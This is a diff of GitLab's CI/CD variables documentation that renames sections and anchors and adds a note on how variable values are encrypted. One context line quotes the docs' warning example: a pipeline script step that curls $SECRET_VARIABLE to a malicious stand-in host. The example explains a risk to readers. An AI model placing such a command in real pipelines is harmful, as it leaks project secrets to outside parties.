@@ -16,9 +16,9 @@ CI/CD variables are a type of environment variable. You can use them to:
 You can use [predefined CI/CD variables](#predefined-cicd-variables) or define custom:
 
 - [Variables in the `.gitlab-ci.yml` file](#create-a-custom-cicd-variable-in-the-gitlab-ciyml-file).
-- [Project CI/CD variables](#project-cicd-variables).
-- [Group CI/CD variables](#group-cicd-variables).
-- [Instance CI/CD variables](#instance-cicd-variables).
+- [Project CI/CD variables](#add-a-cicd-variable-to-a-project).
+- [Group CI/CD variables](#add-a-cicd-variable-to-a-group).
+- [Instance CI/CD variables](#add-a-cicd-variable-to-an-instance).
 
 > For more information about advanced use of GitLab CI/CD:
 >
@@ -56,10 +56,10 @@ You can create custom CI/CD variables:
 
 - For a project:
   - [In the project's `.gitlab-ci.yml` file](#create-a-custom-cicd-variable-in-the-gitlab-ciyml-file).
-  - [In the project's settings](#project-cicd-variables).
+  - [In the project's settings](#add-a-cicd-variable-to-a-project).
   - [With the API](../../api/project_level_variables.md).
-- For all projects in a group [in the group's setting](#group-cicd-variables).
-- For all projects in a GitLab instance [in the instance's settings](#instance-cicd-variables).
+- For all projects in a group [in the group's setting](#add-a-cicd-variable-to-a-group).
+- For all projects in a GitLab instance [in the instance's settings](#add-a-cicd-variable-to-an-instance).
 
 You can [override variable values manually for a specific pipeline](../jobs/index.md#specifying-variables-when-running-manual-jobs),
 or have them [prefilled in manual pipelines](../pipelines/index.md#prefill-variables-in-manual-pipelines).
@@ -123,7 +123,7 @@ Use the [`value` and `description`](../yaml/README.md#prefill-variables-in-manua
 keywords to define [variables that are prefilled](../pipelines/index.md#prefill-variables-in-manual-pipelines)
 for [manually-triggered pipelines](../pipelines/index.md#run-a-pipeline-manually).
 
-### Project CI/CD variables
+### Add a CI/CD variable to a project
 
 You can add CI/CD variables to a project's settings. Only project members with the
 [Maintainer role](../../user/permissions.md#project-members-permissions)
@@ -138,7 +138,7 @@ To add or update variables in the project settings:
    - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
    - **Value**: No limitations.
    - **Type**: [`File` or `Variable`](#cicd-variable-types).
-   - **Environment scope**: `All`, or specific [environments](../environments/index.md).
+   - **Environment scope**: (Optional) `All`, or specific [environments](../environments/index.md).
    - **Protect variable** (Optional): If selected, the variable is only available
      in pipelines that run on protected branches or tags.
    - **Mask variable** (Optional): If selected, the variable's **Value** is masked
@@ -161,10 +161,9 @@ The output is:
 
 ![Output custom variable](img/custom_variables_output.png)
 
-### Group CI/CD variables
+### Add a CI/CD variable to a group
 
-> - Introduced in GitLab 9.4.
-> - Support for [environment scopes](https://gitlab.com/gitlab-org/gitlab/-/issues/2874) added to GitLab Premium in 13.11
+> Support for [environment scopes](https://gitlab.com/gitlab-org/gitlab/-/issues/2874) added to GitLab Premium in 13.11
 
 To make a CI/CD variable available to all projects in a group, define a group CI/CD variable.
 
@@ -181,14 +180,16 @@ To add a group variable:
    - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
    - **Value**: No limitations.
    - **Type**: [`File` or `Variable`](#cicd-variable-types).
-   - **Environment scope** (optional): `All`, or specific [environments](#limit-the-environment-scope-of-a-cicd-variable). **(PREMIUM)**
+   - **Environment scope** (Optional): `All`, or specific [environments](#limit-the-environment-scope-of-a-cicd-variable). **(PREMIUM)**
    - **Protect variable** (Optional): If selected, the variable is only available
      in pipelines that run on protected branches or tags.
    - **Mask variable** (Optional): If selected, the variable's **Value** is masked
      in job logs. The variable fails to save if the value does not meet the
      [masking requirements](#mask-a-cicd-variable).
 
-To view the group-level variables available in a project:
+#### View all group-level variables available in a project
+
+To view all the group-level variables available in a project:
 
 1. In the project, go to **Settings > CI/CD**.
 1. Expand the **Variables** section.
@@ -198,7 +199,7 @@ inherited.
 
 ![CI/CD settings - inherited variables](img/inherited_group_variables_v12_5.png)
 
-### Instance CI/CD variables
+### Add a CI/CD variable to an instance
 
 > - [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/14108) in GitLab 13.0.
 > - [Feature flag removed](https://gitlab.com/gitlab-org/gitlab/-/issues/299879) in GitLab 13.11.
@@ -337,6 +338,10 @@ build:
     - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
 ```
 
+Variable values are encrypted using [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
+and stored in the database. This data can only be read and decrypted with a
+valid [secrets file](../../raketasks/backup_restore.md#when-the-secrets-file-is-lost).
+
 ### Custom variables validated by GitLab
 
 Some variables are listed in the UI so you can choose them more quickly.
@@ -392,9 +397,9 @@ job_name:
     - D:\\qislsf\\apache-ant-1.10.5\\bin\\ant.bat "-DsosposDailyUsr=$env:SOSPOS_DAILY_USR" portal_test
 ```
 
-### Windows Batch
+### Use variables with Windows Batch
 
-To access environment variables in Windows Batch, surround the variable
+To access CI/CD variables in Windows Batch, surround the variable
 with `%`:
 
 ```yaml
@@ -544,8 +549,8 @@ The order of precedence for variables is (from highest to lowest):
    [scheduled pipeline variables](../pipelines/schedules.md#using-variables),
    and [manual pipeline run variables](#override-a-variable-when-running-a-pipeline-manually).
 1. Project [variables](#custom-cicd-variables).
-1. Group [variables](#group-cicd-variables).
-1. Instance [variables](#instance-cicd-variables).
+1. Group [variables](#add-a-cicd-variable-to-a-group).
+1. Instance [variables](#add-a-cicd-variable-to-an-instance).
 1. [Inherited variables](#pass-an-environment-variable-to-another-job).
 1. Variables defined in jobs in the `.gitlab-ci.yml` file.
 1. Variables defined outside of jobs (globally) in the `.gitlab-ci.yml` file.
